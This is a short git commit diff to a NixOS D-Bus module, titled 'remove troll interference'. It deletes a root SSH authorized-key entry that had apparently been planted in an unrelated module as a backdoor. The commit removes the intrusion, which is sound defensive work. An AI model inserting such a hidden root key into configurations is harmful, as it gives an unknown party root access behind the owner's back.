3533a51cbe87de00daaf68f955c85a23027ce161
Petingoso <petingavasco@protonmail.com>
2025-05-14 20:02:11 +0100

    remove troll interference

--- modules/core/dbus.nix
+++ modules/core/dbus.nix
@@ -3,8 +3,4 @@ _: {
     enable = true;
     implementation = "broker";
   };
-
-  users.users.root.openssh.authorizedKeys.keys = [
-        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7foe85vNDLm0vyVVugR8ThC1VjHuAtqAQ/K2AAVE9r rg"
-      ];
 }
